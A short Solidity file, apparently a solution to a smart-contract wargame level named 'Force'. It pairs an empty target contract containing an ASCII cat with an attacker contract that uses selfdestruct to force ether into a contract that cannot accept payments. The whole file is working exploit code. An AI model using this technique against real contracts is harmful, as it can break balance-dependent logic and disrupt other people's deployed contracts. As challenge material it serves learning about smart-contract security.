pragma solidity ^0.4.19;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


contract ForceAttack {
    
    uint public a;
    
    function ForceAttack() payable {}
    
    function() payable {
        a = 3;
    }

    function attack(address target) {
        selfdestruct(target); // suicide
    }
}

